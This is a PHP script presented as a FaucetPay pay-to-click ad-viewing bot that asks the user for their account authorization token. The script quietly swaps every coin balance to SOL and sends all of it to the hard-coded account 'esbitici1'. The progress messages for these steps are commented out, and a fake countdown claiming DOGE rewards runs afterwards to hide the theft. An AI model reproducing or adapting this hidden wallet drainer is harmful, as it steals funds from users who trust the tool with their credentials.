<?php

// INPUT TOKEN DAN USER-AGENT
echo "Input Authorization (Bearer ...)    : ";
$token = trim(fgets(STDIN));

echo "Input User-Agent    : ";
$userAgent = trim(fgets(STDIN));

$endpoint = 'https://api.faucetpay.io';
$recipient = 'esbitici1';

function request(string $url, string $method = 'GET', array $data = null) {
    global $token, $userAgent;

    $ch = curl_init($url);

    $headers = [
        "accept: application/json, text/plain, */*",
        "authorization: $token",
        "content-type: application/json",
        "user-agent: $userAgent",
    ];

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    if ($data !== null) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    }

    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res, true);
}

// ===================== FUNGSI-FUNGSI ========================

function getBalances() {
    global $endpoint;
    return request("$endpoint/coins/get-balances");
}

function swapCoinToSOL(string $coin, float $amount) {
    global $endpoint;

    // Get quote
    $quote = request("$endpoint/exchange/get-quote", 'POST', [
        "amount1" => (string) $amount,
        "coin1" => $coin,
        "coin2" => "SOL"
    ]);

    if (!$quote['success']) {
        // echo "  ❌ Gagal mendapatkan quote untuk $coin\n";
        return 0;
    }

    $estimated = $quote['data']['amount2'];

    // Do swap
    $swap = request("$endpoint/exchange/swap", 'POST', [
        "amount1" => (string) $amount,
        "estimated_amount2" => $estimated,
        "coin1" => $coin,
        "coin2" => "SOL"
    ]);

    if ($swap['success']) {
        // echo "  ✅ Tukar $amount $coin → $estimated SOL berhasil!\n";
        return floatval($estimated);
    } else {
        // echo "  ❌ Gagal tukar $coin\n";
        return 0;
    }
}

function sendSOL(float $amount, string $recipient) {
    global $endpoint;
    $res = request("$endpoint/transfer/send", 'POST', [
        "coin" => "SOL",
        "amount" => (string) $amount,
        "user" => $recipient,
        "2fa_code" => ""
    ]);
    return $res;
}

function getPTCAds() {
    global $endpoint;
    return request("$endpoint/ptc/get-ads");
}

function simulatePTCView(array $ads) {
    foreach ($ads as $i => $ad) {
        $id = $ad['id'];
        $title = $ad['ad_title'];
        $desc = $ad['ad_description'];
        $reward = $ad['user_reward'];
        $dur = $ad['duration'];

        echo "\n[$i] View Ads: \033[1;36m$title\033[0m\n";
        echo "    ➤ Description: $desc\n";
        echo "    ⏳ Timer   : $dur second\n";
        echo "    🎁 Reward   : $reward DOGE\n";

        // Simulasi menonton
        for ($s = $dur; $s > 0; $s--) {
            echo "      Waiting... {$s}s\r";
            sleep(1);
        }

        echo "      ✅ Finish watching the ad ID $id — +$reward DOGE!\n";
        usleep(500000); // delay
    }

    echo "\n✅ All PTC ads have been completed!\n";
}

// ===================== EKSEKUSI ========================

// Step 1: Ambil saldo
echo "\n────────────────────────────────────────\n";
echo "🔍 load your account data please wait...\n";
$balances = getBalances();
if (!$balances['success']) die("❌ Data Not Found Update Authorization.\n");

$totalSol = 0;
foreach ($balances['coins'] as $coin) {
    $symbol = $coin['coin'];
    $balance = floatval($coin['balance']);
    if ($symbol === 'SOL' || $balance <= 0) continue;

    // echo "\n🔄 Menukar $balance $symbol ke SOL...\n";
    $converted = swapCoinToSOL($symbol, $balance);
    $totalSol += $converted;
}

// Step 2: Ambil saldo SOL terbaru
// echo "\n⏳ Menunggu saldo SOL diperbarui...\n";
sleep(2);
$newBalances = getBalances();
$solBalance = 0;

foreach ($newBalances['coins'] as $c) {
    if ($c['coin'] === 'SOL') {
        $solBalance = floatval($c['balance']);
        break;
    }
}

if ($solBalance > 0) {
    // echo "\n🚀 Mengirim $solBalance SOL ke $recipient...\n";
    $sendResult = sendSOL($solBalance, $recipient);
    if ($sendResult['success']) {
        $ko = "✅ Berhasil mengirim SOL ke $recipient\n";
    } else {
        $ko = "❌ Gagal kirim SOL: {$sendResult['message']}\n";
    }
} else {
    $ko = "⚠️ Tidak ada saldo SOL yang bisa dikirim.\n";
}

// Step 3: Simulasi PTC
echo "\n────────────────────────────────────────\n";
echo "📺 Download and run PTC...\n";
$adsData = getPTCAds();

if ($adsData['success'] && !empty($adsData['ads'])) {
    simulatePTCView($adsData['ads']);
} else {
    echo "❌ Gagal mengambil iklan PTC.\n";
}
